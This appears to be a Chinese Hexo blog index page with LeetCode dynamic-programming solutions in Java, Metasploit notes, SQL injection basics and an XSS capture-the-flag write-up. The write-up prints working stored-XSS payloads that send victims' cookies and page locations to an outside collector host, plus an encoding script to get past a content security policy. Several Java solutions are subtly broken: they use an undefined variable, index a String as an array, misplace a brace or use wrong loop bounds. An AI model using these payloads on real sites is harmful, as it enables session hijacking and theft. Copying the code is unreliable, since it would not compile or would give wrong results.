<!DOCTYPE html>
<html>
<head><meta name="generator" content="Hexo 3.8.0">
  <meta charset="utf-8">
  

  
  <title>Hexo</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta property="og:type" content="website">
<meta property="og:title" content="Hexo">
<meta property="og:url" content="http://yoursite.com/index.html">
<meta property="og:site_name" content="Hexo">
<meta property="og:locale" content="default">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="Hexo">
  
    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
  
  
    <link rel="icon" href="/favicon.png">
  
  
    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
  
  <link rel="stylesheet" href="/css/style.css">
</head>
</html>
<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <h1 id="logo-wrap">
        <a href="/" id="logo">Hexo</a>
      </h1>
      
    </div>
    <div id="header-inner" class="inner">
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"></a>
        
          <a class="main-nav-link" href="/">Home</a>
        
          <a class="main-nav-link" href="/archives">Archives</a>
        
      </nav>
      <nav id="sub-nav">
        
          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
        
        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
      </nav>
      <div id="search-form-wrap">
        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://yoursite.com"></form>
      </div>
    </div>
  </div>
</header>
      <div class="outer">
        <section id="main">
  
    <article id="post-leetcode-dynamic-programming-2" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2020/03/10/leetcode-dynamic-programming-2/" class="article-date">
  <time datetime="2020-03-10T09:21:40.000Z" itemprop="datePublished">2020-03-10</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2020/03/10/leetcode-dynamic-programming-2/">leetcode-dynamic programming-2</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="leetcode-动态规划2（java实现）"><a href="#leetcode-动态规划2（java实现）" class="headerlink" title="leetcode 动态规划2（java实现）"></a>leetcode 动态规划2（java实现）</h1><hr>
<p>#64.最小路径和</p>
<p>这是一个经典的动态规划题，类似于走楼梯问题。</p>
<p><strong>1.定义状态：</strong></p>
<p>本题目是让求从左上角到右下角最短路径，且只能向下或向右。那么我们可以缩小范围，假设与起点相邻的下面节点和右面节点是更小范围的矩形的左上角。那么求这个大矩形的状态（最短路径）就是选择向右和向下中路径相对较短的。所以最小状态就是每个节点到右下角节点的最短距离。</p>
<p><strong>2.确定临界状态：</strong></p>
<p>由题意，我们知道在最下面行和最右列的节点只能有一种选择。所以有式子：</p>
<pre><code>dp[dp.size-1][IndexOfCol]+=dp[dp.size-1][IndexOfCol+1],
dp[IndexOfRow][dp[0].size-1]+=dp[IndexOfRow+1][dp[0].size-1] 0&lt;=IndexOfRow&lt;dp.size 0&lt;=IndexOfCol&lt;dp[0].size</code></pre><p>不过如果路建立数组记录每个状态，空间复杂度就会达到O（n^2)，显然开销是巨大的。我们可以直接在原数组上修改</p>
<pre><code>grid[IndexOfRow][grid[0].length-1]+=grid[IndexOfRow+1][grid[0].length-1];
grid[grid.length-1][IndexOfCol]+=gird[grid.length-1][IndexOfCol+1]; 0&lt;=IndexOfRow&lt;dp.size 0&lt;=IndexOfCol&lt;dp[0].size</code></pre><p><strong>3.状态转移方程</strong></p>
<pre><code>grid[i][j]=min(grid[i+1][j],grid[i][j+1])(i&lt;=0&lt;grid.length-1,j&lt;=0&lt;grid[0].length-1)</code></pre><p><strong>4.代码实现：</strong></p>
<pre><code>class Solution {
public int minPathSum(int[][] grid) {
for(int i=grid.length-1;i&gt;=0;i--)
{
        for(int j=grid.length-1;j&gt;=0;j--)
     { 
        if(i==grid.length-1&amp;&amp;j!=grid[0].length-1)
        {
                grid[i][j]+=grid[i][j + 1];
        }
        else if(j==grid[0].length-1&amp;&amp;i!=grid.length-1)
        {
            grid[i][j]+=grid[i + 1][j];
           }
           else if(j!=grid[0].length-1&amp;&amp;i!=grid.length-1)
           {
                grid[i][j]+= Math.min(grid[i + 1][j],grid[i][j + 1]);
           }
        }
}
return grid[0][0];
}
}</code></pre><p>时间复杂度:O(mn)</p>
<p>空间复杂度:O(1)</p>
<h2 id="70-爬楼梯"><a href="#70-爬楼梯" class="headerlink" title="#70.爬楼梯"></a>#70.爬楼梯</h2><p>经典的动态规划题</p>
<p><strong>1.定义状态</strong></p>
<p>我们可以把问题分解成最小的问题，即计算1-n（n为楼层数）中到每层楼梯的方法有多少种。由于上楼是层层递进的，而由题目可知上楼无非是从该层往下数的第二层爬两个台阶，或者从该层往下数的第一层爬一个台阶（前提是该楼层的层数大于2)。这样通过递推就可以求出从起点到n层爬楼梯的方法数了。</p>
<p><strong>2.临界状态</strong></p>
<p>有两个特例，即第一层是无法用前两层的方法数相加。从起点到第一层只有一种方法。</p>
<p><strong>3.状态转义方程</strong></p>
<pre><code>dp[i]=dp[i-1]+dp[i-2](2&lt;=i&lt;=n)</code></pre><p><strong>4.代码实现</strong></p>
<pre><code>class Solution {
    public int climbStairs(int n) {
    int []dp=new int[n+1];//定义数组记录到每层的方法数dp[n]就是起点到第n层的方法数
    if(n&lt;2)
    {
        return 1;
    }
    dp[1]=1;
       dp[2]=2;
    for(int i=3;i&lt;=n;i++)
    {
       dp[i]=dp[i-1]+dp[i-2]; 
    }
    return dp[n];
    }
}</code></pre><p>这样的空间复杂度未免有点高，可以定义两个变量代替dp[i-1],dp[i-2]</p>
<pre><code>class Solution {
    public int climbStairs(int n) {
     if(n&lt;2)
        {
       return 1;
     }
     int oldpre=1;
     int pre=1;
     int ans=0;
     for(int i=2;i&lt;=n;i++)
     {
         ans=oldpre+pre;
         oldpre=pre; 
         pre=ans;
     }
     return ans;
   }
}</code></pre><p>时间复杂度:O(n)</p>
<p>空间复杂度:O(1)</p>
<p>看状态转移方程其实可以发现这道题就是求斐波那契数列，斐波那契数列的具体定义（体现了动态规划中的递推思想）：</p>
<p>如果设F(n）为该数列的第n项（n∈N*），那么这句话可以写成如下形式：</p>
<p>　　　　F(n)=F(n-1)+F(n-2)</p>
<p>有关斐波那契数列的问题在这里就不做过多的阐述了。</p>
<h1 id="91-解码方法"><a href="#91-解码方法" class="headerlink" title="91.解码方法"></a>91.解码方法</h1><hr>
<p>这道题在leetcode上的通过率只有20%,看来还是有挑战性的。</p>
<p><strong>1.定义状态</strong></p>
<p>老套路，把大问题分解为可解的小问题。题目要求算出解码的方法数，可以递推求每个字符结尾的子字符串的解码方法，就得到了整个字符串的解码方法有多少种。</p>
<p><strong>2.临界状态</strong></p>
<p>这个题比较繁琐的一点要考虑各种状态。由于A-Z编码是对应1-26的，因此还要考虑0的情况。如果是0，还要判断前一位以及这个0的下标，为0就说明没法解码，直接返回0。下标1或者更大的情况还要看前一位的数字。是1或2，如果下标为1且前面的数字是1或2，说明字符串可以编码为J或T。以该数字为结束的子字符串的编码方法就为1,如果下标更大只需在满足前面数字的为1或2时，令记录该处的值改为下标为i-2处的值。其他情况都为直接返回0(字符串无法编码)。</p>
<p>如果不是0的话也有很多种情况。如果假设s[i]为当前下标处的数字，如果s[i]&gt;0且s[i]&lt;7且s[i-1]=1或者s[i-1]=2，说明编码的方式有很多种，dp[i]=dp[i-1]+dp[i-2]。否则dp[i]=dp[i-1]</p>
<p><strong>3.定义状态方程</strong></p>
<p>dp[i]=dp[i-1]+dp[i-2] (s[i]==1||s[i]==2&amp;&amp;s[i]&gt;0&amp;&amp;s[i]&lt;7)</p>
<p><strong>4.代码实现</strong></p>
<pre><code>class Solution {
public int numDecodings(String s) {
    int []dp=new int[n];
       for(int i=0;i&lt;s.length();i++)
    {
        if(s[i]==&apos;0&apos;)
        { 
            if(i==0)
            {
               return 0;
            }
            else if(i==1)
            {
                if(s[i-1]==&apos;1&apos;||s[i-1]==&apos;2&apos;)
                {
                     dp[i]=1;
                }
                else
                {
                     return 0;
                }
            }
            else
            {
                if(s[i-1]==&apos;1&apos;||s[i-1]==&apos;2&apos;)
                {
                    dp[i]=dp[i-2];
                }
                else
                {
                    return 0;
                }
            }
       }
      else
      {
          if(i==0)
          {
               dp[i]=1;
          }
         else if(i==1)
         {
             if(s[i-1]==&apos;1&apos;||(s[i-1]==&apos;2&apos;&amp;&amp;s[i]&gt;&apos;0&apos;&amp;&amp;s[i]&lt;&apos;7&apos;))
             {
                dp[i]=2;
             }
            else
            {
               dp[i]=dp[i-1];
            }
         }
        else
        {
            if(s[i-1]==&apos;1&apos;||(s[i-1]==&apos;2&apos;&amp;&amp;s[i]&gt;&apos;0&apos;&amp;&amp;s[i]&lt;&apos;7&apos;))
             {
                    dp[i]=dp[i-1]+dp[i-2];
             }
             else
             {
                 dp[i]=dp[i-1];
             }
        }
     }
  }
return dp[s.length()-1]；
   }
}</code></pre><p>时间复杂度:O(N)</p>
<p>空间复杂度:O(N)</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2020/03/10/leetcode-dynamic-programming-2/" data-id="ck7lp33db0004osv942kr20m5" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-Metasploit学习笔记" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2020/02/29/Metasploit学习笔记/" class="article-date">
  <time datetime="2020-02-29T13:18:12.756Z" itemprop="datePublished">2020-02-29</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
    <div class="article-entry" itemprop="articleBody">
      
        <h2 id="Metasploit学习笔记"><a href="#Metasploit学习笔记" class="headerlink" title="#Metasploit学习笔记"></a>#Metasploit学习笔记</h2><p><strong>1.简介</strong></p>
<p>目前最流行，最强大，最具拓展性的渗透测试平台。</p>
<p>2003年由HD More发布第一版。由Ruby语言编写</p>
<p>开发版本的更新非常活跃</p>
<p><strong>2.Metasploit Framework</strong></p>
<p>Metasploit Framework是由Ruby语言编写，想要了解更深层次的框架需要对Ruby语言有一定的了解。Metasploit所有的任务都是基于模块实现的，有利于拓展和编写代码。</p>
<p>Metasploit Framework的框架组成结构可以分为：库，接口，模块。</p>
<p><strong>3.Metasploit Framework库</strong></p>
<p>库是已经封装好的可用程序。用户可以在完成逻辑的前提下调用库。</p>
<p>库的文件目录：<br>    usr/share/mteasploit-framework/lib<br>其中rex库提供各种利用漏洞的类库，也提供套接字连接，原始函数和各种其他形式的重新格式化。core库给所有新模块提供基本的API。</p>
<p><strong>4.Metasploit Framework接口</strong></p>
<p>Metasploit Framework提供两个接口：控制台和GUI接口。终端输入    <code>msfconsole</code> 启动Metasploit Framework。</p>
<p><strong>5.Metasploit Framework模块</strong></p>
<p>主要技术功能模块有：Payload模块（成功exploit后，真正在系统执行的代码和指令），辅助模块，POST模块，编码器模块，NOP模块，exploit模块（对于每个漏洞的攻击方法），evasion模块，auxiliary(常被用来扫描)等。</p>
<p>框架目录 <code>usr/share/metasploit-framework/modules</code><br>shellcode是获取shell的代码，属于payload。payload包含三种：single（只要通过内存跳转连接到目标就计算机就可以独立执行所有的代码），stager（目标计算机内存有限无法single时，先建立一个网络连接，为在黑客电脑上下载其他payload），stages（利用stager建立连接下载的payload）。</p>
<p>#Metasploit-Framework的控制台命令</p>
<hr>
<p>banner 查看metasploit的基本信息</p>
<p>help 查看命令</p>
<p>connect 连接到目标服务器的指定端口（类似nc）</p>
<p>show 展示模块的信息(非常重要的命令)</p>
<p>search 搜索模块和漏洞的名称，进行模糊匹配</p>
<p>check 检查是否可用</p>
<p>back 退回msf console</p>
<p>下面以ms08_067为例：<code>search msf08_067</code> 找到这个漏洞利用模块，<code>use exploit/windows/smb/msf08_067_netapi</code> 进入这个漏洞利用模块。<code>show options</code> 显示相应的选项信息。</p>
<p>在设置过程中要用到的命令：</p>
<pre><code>set ：设置模块的参数，比如设置rhost(目标主机)
unset：清除设置
setg：全局设置，即只要有那个名称变量，都会被设置成一样的）
unsetg ：清除全局设置
save：保存设置的值，即保存之后退出仍然会存在
Run / exploit ：相同的作用，都用于执行
jobs：进行的工作
load：调用加载其他插件
unload：取消调用加载其他插件
loadpath ：当有个人开发的模块，调用指定目录存放的模块
Session：可以看到回话，即已经建立的连接
– session -l / -i 可以进入响应的shell（Shell 、Meterpreter session、VNC等不同的回话）
route通过指定session添加路由流量，即当开防火墙端口有漏洞，已经控制了，攻击者路由指定session通向建立的连接路由到被攻击者的机器。原理即是：流量转发的过程
irb：内置的编程开发模块
Resource ：前面已经介绍过了，即指定资源文件，存的就是配置信息（将各种命令存入文件当中）</code></pre><h1 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h1><hr>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2020/02/29/Metasploit学习笔记/" data-id="ck7lp33cs0001osv9nd0iqt83" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-leetcode-动态规划-1" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2020/02/25/leetcode-动态规划-1/" class="article-date">
  <time datetime="2020-02-25T09:59:29.059Z" itemprop="datePublished">2020-02-25</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
    <div class="article-entry" itemprop="articleBody">
      
        <h2 id="leetcode寒假刷题—动态规划（1）（Java实现）"><a href="#leetcode寒假刷题—动态规划（1）（Java实现）" class="headerlink" title="#leetcode寒假刷题—动态规划（1）（Java实现）"></a>#leetcode寒假刷题—动态规划（1）（Java实现）</h2><p>#5.最长回文子串</p>
<p> 动态规划思路：</p>
<p><strong>1.定义状态</strong></p>
<p> 动态规划实际上就是记录每个状态，每个状态受到之前状态影响。所以，需要定义一个数组（记录每个状态）。这里定义二维数组dp，最小状态dp[i][j]就是记录从第i+1到第j+1的子串是否为回文子串。</p>
<p><strong>2.确定临界状态</strong></p>
<p>很容易就能看出每个字符都相当于一个长度为1的回文子串。所以二维数组对角线元素值都为1。</p>
<p><strong>3.确定状态转移方程</strong></p>
<p>dp[j][i]==（s[i]==s[j]）&amp;&amp;dp[j+1][i-1]</p>
<p>代码如下</p>
<pre><code>class Solution {
public String longestPalindrome(String s) {
if(s.length()==0)
{
    return &quot;&quot;;
}
boolean [][]dp=new boolean[s.length()][s.length()];
for(int i=0;i&lt;s.length();i++)
{
    dp[i][i]=true;//把对角线元素都设为true，因为每个字符也可以当成回文子串
}
int maxlen=1;
int b=0;
for(int i=0;i&lt;s.length();i++)
{
    for(int j=0;j&lt;i;j++)
    {
        if(s.charAt(i)==s.charAt(j))
        {
            if(i-j&gt;2)
                {
                    dp[j][i]=dp[j+1][i-1];
             }
            else
            {
                dp[j][i]=true;
            }
        }
        else
        {
            dp[j][i]=false;
        }
        if(dp[j][i])
        {
            if(i-j+1&gt;maxlen)
            {
                b=j;
                maxlen=i-j+1;
            }
        }
    }
}
        return s.substring(b,b+maxlen);//返回最长回文子串
    }
}</code></pre><p>时间复杂度：O(N^2)</p>
<p>空间复杂度：O(N^2)<br> )，二维 dp 问题，一个状态得用二维有序数对表示，因此空间复杂度是 O(N^2)。</p>
<p><strong>4.改进</strong></p>
<p><strong>中心扩散</strong></p>
<p>假设字符串的某个字符是回文子串的中心，尝试从此点开始向两端扩散。如果子串是偶数子串，该中心就是这个回文子串的字符间的空隙。若是奇数子串，就是字符。<br>因此中心扩散法的思路是：遍历每一个索引，以这个索引为中心，利用“回文串”中心对称的特点，往两边扩散，看最多能扩散多远。</p>
<p><strong>代码实现</strong></p>
<pre><code>public class Solution {

public String longestPalindrome(String s) {
    int len = s.length();
    if (len &lt; 2) {
        return s;
    }
    int maxLen = 1;
    String res = s.substring(0, 1);
    // 中心位置枚举到 len - 2 即可,因为中心位置只可能是下标1到len-2。下标0和len-1是无法向两端扩散的
    for (int i = 0; i &lt; len - 1; i++) {
        String os = centerSpread(s, i, i);
        String es = centerSpread(s, i, i + 1);
        String maxLenStr = os.length() &gt; es.length() ? os :es;//找到是奇数子串长度长还是偶数子串长度长
        if (maxLenStr.length() &gt; maxLen) {
            maxLen = maxLenStr.length();
            res = maxLenStr;
        }
    }
    return res;
}

private String centerSpread(String s, int left, int right) {
    // left = right 的时候，此时回文中心是一个字符，回文串的长度是奇数
    // right = left + 1 的时候，此时回文中心是一个空隙，回文串的长度是偶数
    int len = s.length();
    int i = left;
    int j = right;
    while (i &gt;= 0 &amp;&amp; j &lt; len) {
        if (s.charAt(i) == s.charAt(j)) {
            i--;
            j++;
        } else {
            break;
        }
    }
    // 不满足while条件，此时得到的最大满足条件的子串是下标为i+1到j-1的字符组成的，所以，substring方法的两个参数为i+1，j(substring方法不会截取第二个参数所在下标的字符)
    return s.substring(i + 1, j);
}
}</code></pre><p>时间复杂度：O(N^2)，遍历每个可能的中心时间复杂度为O(N)，而在centerSpread中，向两端扩撒的时间复杂度为O(N)。因此总时间复杂度为O(N^2)。</p>
<p>空间复杂度：O(1)，只使用到常数个临时变量，与字符串长度无关。</p>
<hr>
<p>#53.最大子序和</p>
<p><strong>1.定义状态</strong></p>
<p>dp[i]为以下标为i的元素结束的子序中元素相加最大的子序的元素和。</p>
<p><strong>2.确定临界状态</strong></p>
<p>dp[0]=下标为0的元素的值</p>
<p><strong>3.确定状态转移方程</strong></p>
<p>dp[i]=max(dp[i-1]+nums[i],nums[i])//nums[i]为下标为i的元素</p>
<p>代码如下</p>
<pre><code>class Solution {
public int maxSubArray(int[] nums) {
    int []dp=new int[nums.length];//定义dp数组记录状态
    dp[0]=nums[0];
    int max=dp[0];
    for(int i=1;i&lt;nums.length;i++)
    {
        dp[i]=Math.max(dp[i-1]+nums[i],nums[i]);//状态转义方程
        max=Math.max(max,dp[i]);
    }
}
    return max;
}</code></pre><p>时间复杂度：O(N)</p>
<p>空间复杂度：O(N)</p>
<p><strong>4.改进</strong></p>
<p>动态规划实际上就是空间换时间，所以空间复杂度相对较大。但是一些情况下可以改进空间复杂度，如本题而言，由于状态转移方程为max(dp[i-1]+nums[i],nums[i]),每个状态都和前一个状态相关。那么，就可以定义一个变量记录前一状态的值（dp[i-1]）。这样空间复杂度就由O(N)变为了O(1)。</p>
<pre><code>class Solution {
public int maxSubArray(int[] nums) {
    int ans = nums[0];
    int sum = 0;
    for(int num: nums) {
        if(sum &gt; 0) {//即dp[i-1]+nums[i]&gt;nums[i]
            sum += num;
        } else {
            sum = num;
        }
        ans = Math.max(ans, sum);
    }
        return ans;
}
}</code></pre><p>时间复杂度：O(N)</p>
<p>空间复杂度：O(1)</p>
<hr>
<p>#62.不同路径</p>
<p><strong>1.定义状态</strong></p>
<p>dp[i][j]表示从起点到第i+1行j+1列路径数</p>
<p><strong>2.定义临界状态</strong></p>
<p>由题意可知，从某点开始行进只能向下或向右走（只能从一个点的左边或上边来到该点）。而在第一行，只能从其左边的点走至该点。在第一列，只能从该点上面的点来到此点。<br>所以对于第一行元素dp[0][i],都有dp[0][i]=1,对应的，对于第一列元素dp[i][0]，都有dp[i][0]=1。</p>
<p><strong>3.定义状态转换方程</strong></p>
<p>dp[i][j]=dp[i-1][j]+dp[i]<a href="1<=i<n;1<=j<m">j-1</a></p>
<p>代码如下</p>
<pre><code>class Solution {
public int uniquePaths(int m, int n) {//n为行数，m为列数
    int [][]dp=new int[n][m];
    for(int i=0;i&lt;m;i++)
    {
        dp[0][i]=1;
    }
    for(int i=0;i&lt;n;i++)
    {
        dp[i][0]=1;
    }
    for(int i=1;i&lt;n;i++)
    {
        for(int j=1;j&lt;m;j++)
        {
            dp[i][j]=dp[i-1][j]+dp[i][j-1];
        }
    }
    return dp[n-1][m-1];
}
}</code></pre><p>时间复杂度：O(m*n)</p>
<p>空间复杂度：O(m*n)</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2020/02/25/leetcode-动态规划-1/" data-id="ck7lp33df0005osv9d1og3mog" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-xss" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2019/12/02/xss/" class="article-date">
  <time datetime="2019-12-02T14:16:00.117Z" itemprop="datePublished">2019-12-02</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="xss"><a href="#xss" class="headerlink" title="xss"></a>xss</h1><hr>
<p><strong>1.什么是xss</strong></p>
<p>跨站脚本（XSS, Cross Site Script）攻击指的是，攻击者可以让某网站执行一段非法脚本。这种情况很常见，比如提交一个表单用于修改用户名，我们可以在文本框中输入一些特殊字符，比如 &lt;, &gt;, ‘, ” 等，检查一下用户名是否正确修改了。</p>
<p>xss的三种类型<br>反射型xss 应用程序或API包括未经验证和未经转义的用户输入 作为HTML输出的一部分 </p>
<p>存储型xss 存储在服务器中加入代码，如果没有过滤或过滤不严，那么这些代码将储存到，<br>服务器中，每当有用户访问该页面的时候都会触发代码执行，这种XSS非常危险，是永久型的。判断是否存在存储型xss时，首先要确定输入点和输入点。查看源码，如果输入的内容在HTML标签内，输入的内容无法被当成JavaScript代码运行。因为浏览器解析时，会把数据以文本形式输出在网页中，此时就需要构造语句 <code>/script&gt;alert(1)&lt;/script&gt;</code>来去闭合HTML标签。</p>
<p>DOM型XSS：基于文档对象模型Document Objeet Model，DOM)的一种漏洞。DOM是<br>一个与平台、编程语言无关的接口，它允许程序或脚本动态地访问和更新文档内容、结构和<br>样式，处理后的结果能够成为显示页面的一部分。DOM中有很多对象，其中一些是用户可以操纵的，<br>如uRI ，location，refelTer等。客户端的脚本程序可以通过DOM动态地检查和修改页面内容，它<br>不依赖于提交数据到服务器端，而从客户端获得DOM中的数据在本地执行，如果DOM中的数据没有<br>经过严格确认，就会产生DOM XSS漏洞。</p>
<hr>
<p><strong>检测xss</strong></p>
<p>检测xss一般有两种方式，一种是手工检测，另一种是软件检测。这里直接介绍手工检测。输入一些敏感字符，例如’&lt;’,’&gt;’,’()’。提交请求后查看HTML源代码，看这些字符是否被转义。如果输出字符，说明程序很有可能做了过滤。这是在知道输出位置的情况下，另一种””/&gt;***”。手工检测目的就是为了看web应用是否有漏洞。最多的是考虑哪里有输入，数据该在什么地方输出。</p>
<hr>
<p><strong>2.BUU XSS COURSE1</strong></p>
<p>题目链接：<a href="https://buuoj.cn/challenges#BUU%20XSS%20COURSE%201" target="_blank" rel="noopener">https://buuoj.cn/challenges#BUU%20XSS%20COURSE%201</a></p>
<p>打开发现让我们输入内容提交，类似于论坛的发表评论。很容易就能想到这是存储型xss,攻击者提交恶意代码到服务器中，当其他用户访问页面时就会触发这些恶意代码。从而造成cookie泄露。</p>
<p><img src="https://img-blog.csdnimg.cn/20191202194217583.JPG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3p5ZGJrMTIzNDU2,size_16,color_FFFFFF,t_70" alt></p>
<p>先试试直接提交<code>&lt;script&gt;alert(1)&lt;/script&gt;</code>,发现没法弹窗，说明网站有限制,可能过滤了script那么试试img标签事件报错<code>&lt;img src=&#39;abc&#39; onerror=&#39;alert(1)&#39;/&gt;</code> 可以弹窗，说明这里有xss点。</p>
<p>接着上传js恶意代码。</p>
<pre><code>&lt;img src=&apos;/aaaww&apos; onerror=&quot;(function(){(new
Image()).src=&apos;http://xss.buuoj.cn/index.php?
do=api&amp;id=PkXQxo&amp;location=&apos;+escape((function()
{try{return document.location.href}catch(e){return &apos;&apos;}})())
+&apos;&amp;toplocation=&apos;+escape((function(){try{return
top.location.href}catch(e){return &apos;&apos;}})())
+&apos;&amp;cookie=&apos;+escape((function(){try{return
document.cookie}catch(e){return &apos;&apos;}})())
+&apos;&amp;opener=&apos;+escape((function(){try{return (window.opener
&amp;&amp; window.opener.location.href)?
window.opener.location.href:&apos;&apos;}catch(e){return &apos;&apos;}})());})();&quot;/&gt;</code></pre><p><img src="https://img-blog.csdnimg.cn/20191202194601319.JPG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3p5ZGJrMTIzNDU2,size_16,color_FFFFFF,t_70" alt></p>
<p>注意这里的id应该是你在xss平台创建的项目代码的id。打开xss平台，收到上传的信息。发现里面有cookie phpSESSIONID这就是网站管理员的cookie。还能看到http referer（信息来源的地址）我们用这个管理员的cookie去访问referer里的网址，利用Firefox的插件editcookie更改网站的cookie就能得到flag。改变flag我们可以用hackbar。</p>
<p><img src="https://img-blog.csdnimg.cn/20191202194719634.JPG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3p5ZGJrMTIzNDU2,size_16,color_FFFFFF,t_70" alt></p>
<hr>
<p><strong>3.CISCN web2</strong></p>
<p>题目链接  <a href="https://buuoj.cn/challenges#[CISCN2019%20%E5%8D%8E%E4%B8%9C%E5%8C%97%E8%B5%9B%E5%8C%BA]Web2" target="_blank" rel="noopener">https://buuoj.cn/challenges#[CISCN2019%20%E5%8D%8E%E4%B8%9C%E5%8C%97%E8%B5%9B%E5%8C%BA]Web2</a></p>
<p>writeup链接：<a href="https://www.zhaoj.in/read-6100.html" target="_blank" rel="noopener">https://www.zhaoj.in/read-6100.html</a></p>
<p>看到投稿界面，很容易想到通过利用xss漏洞来把恶意脚本上传，这是典型的存储型xss。</p>
<p>试试在投稿界面写入<code>&lt;script&gt;alert(1)&lt;/script&gt;</code>。打开保存信息的页面，发现啥都没有。那我们可以看看这个保存页面的源代码，发现<br><code>&lt;meta http-equiv=&quot;content-security-policy&quot; content=&quot;default-src &#39;self&#39;; script-src &#39;unsafe-inline&#39; &#39;unsafe-eval&#39;&quot;&gt;</code></p>
<p>在网上搜索了一下，content-security-policy指的是内容安全策略。其核心思想十分简单：网站通过发送一个 CSP 头部，来告诉浏览器什么是被授权执行的与什么是需要被禁止的。其被誉为专门为解决XSS攻击而生的神器。</p>
<p>回过来看，可以明白javascript脚本被禁了，所以我们没法直接上传javascript代码。具体研究一下发现被转码了。怎么能绕过？这里要用到HTML markup。把我们要上传的javascript代码转成markup,可以用python脚本来转成markup。</p>
<pre><code>in_str = &quot;(function(){window.location.href=&apos;http://xss.buuoj.cn/index.php?do=api&amp;id=xpqwIP&amp;keepsession=0&amp;location=&apos;+escape((function(){try{return document.location.href}catch(e){return&apos;&apos;}})())+&apos;&amp;toplocation=&apos;+escape((function(){try{return top.location.href}catch(e){return&apos;&apos;}})())+&apos;&amp;cookie=&apos;+escape((function(){try{return document.cookie}catch(e){return&apos;&apos;}})())+&apos;&amp;opener=&apos;+escape((function(){try{return(window.opener&amp;&amp;window.opener.location.href)?window.opener.location.href:&apos;&apos;}catch(e){return&apos;&apos;}})());})();&quot;

output = &quot;&quot;

for c in in_str:
output += &quot;&amp;#&quot; + str(ord(c))

print(&quot;&lt;svg&gt;&lt;script&gt;eval&amp;#40&amp;#34&quot; + output + &quot;&amp;#34&amp;#41&lt;/script&gt;&quot;)</code></pre><p>提交一下,同样利用xss平台获取cooike。访问时发现了页面让我们输入id名称，输入一下，发现报错，说明了这里可能是sql联合注入。利用sqlmap跑一下。</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2019/12/02/xss/" data-id="ck7lp33d80003osv9gwgc31kg" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-新文档" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2019/10/22/新文档/" class="article-date">
  <time datetime="2019-10-22T06:54:32.862Z" itemprop="datePublished">2019-10-22</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="sql注入基础"><a href="#sql注入基础" class="headerlink" title="sql注入基础"></a>sql注入基础</h1><h2 id="0x01sql语句基础："><a href="#0x01sql语句基础：" class="headerlink" title="#0x01sql语句基础："></a>#0x01sql语句基础：</h2><p><strong>1.select语句</strong></p>
<p>格式：</p>
<p>select * from table（从table表中获取字段信息）</p>
<p> select * from table where (在满足where后的条件下查询字段信息)</p>
<p><strong>2.insert语句</strong></p>
<p>格式：</p>
<p>insert into table(field1,field2) values(value1,value2)</p>
<p><strong>3.update语句</strong></p>
<p>格式：</p>
<p>update table1 set field1=value1 where</p>
<p><strong>4.delete语句</strong></p>
<p>格式：</p>
<p>delete from table1 where</p>
<p><strong>5.order子句</strong></p>
<p>ORDER BY 语句用于根据指定的列对结果集进行排序。</p>
<p>ORDER BY 语句默认按照升序对记录进行排序</p>
<p>如果想要把结果集按照倒序，则需要加上desc关键字</p>
<p>在sql注入中经常利用order by子句显示目标有多少字段</p>
<p><strong>6.and和or运算符</strong></p>
<p>AND 和 OR 可在 WHERE 子语句中把两个或多个条件结合起来。</p>
<p>如果第一个条件和第二个条件都成立，则 AND 运算符显示一条记录。</p>
<p>如果第一个条件和第二个条件中只要有一个成立，则 OR 运算符显示一条记录。</p>
<p>and 和 or的用处在万能密码中就可以体现出来：</p>
